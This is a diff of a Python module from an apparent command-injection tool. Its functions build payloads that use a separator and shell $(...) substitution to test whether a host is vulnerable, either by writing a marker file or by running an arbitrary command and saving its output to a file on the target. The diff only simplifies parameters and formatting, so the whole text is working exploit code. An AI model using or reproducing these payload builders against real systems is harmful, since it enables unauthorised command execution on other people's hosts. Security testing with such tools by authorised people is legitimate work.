@@ -22,10 +22,10 @@
 # ----------------------------------------------------------
 # File-based decision payload (check if host is vulnerable). 
 # ----------------------------------------------------------
-def decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
-  
+def decision(separator, TAG, OUTPUT_TEXTFILE):
+
   payload = (separator + " " +
-            "$(echo " + B64_ENC_TAG + "" + B64_DEC_TRICK + " > " + OUTPUT_TEXTFILE + ")"
+            "$(echo " + TAG + "" + " > " + OUTPUT_TEXTFILE + ")"
             ) 
   
   return payload
@@ -33,9 +33,10 @@ def decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def decision_alter_shell(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
+def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
+
   payload = (separator + " " + 
-            "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('"+ B64_ENC_TAG + "" + B64_DEC_TRICK + "')\nf.close()\n\")"
+            "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('"+ TAG + "')\nf.close()\n\")"
              ) 
 
   return payload
@@ -43,7 +44,7 @@ def decision_alter_shell(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
 # ---------------------------------------------
 # Execute shell commands on vulnerable host.
 # ---------------------------------------------
-def cmd_execution(separator,cmd,OUTPUT_TEXTFILE):
+def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
   
   payload = (separator +
              "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
@@ -54,9 +55,10 @@ def cmd_execution(separator,cmd,OUTPUT_TEXTFILE):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def cmd_execution_alter_shell(separator,cmd,OUTPUT_TEXTFILE):
+def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
+  
   payload = (separator + 
-            "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
+            "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
             )
   
   return payload
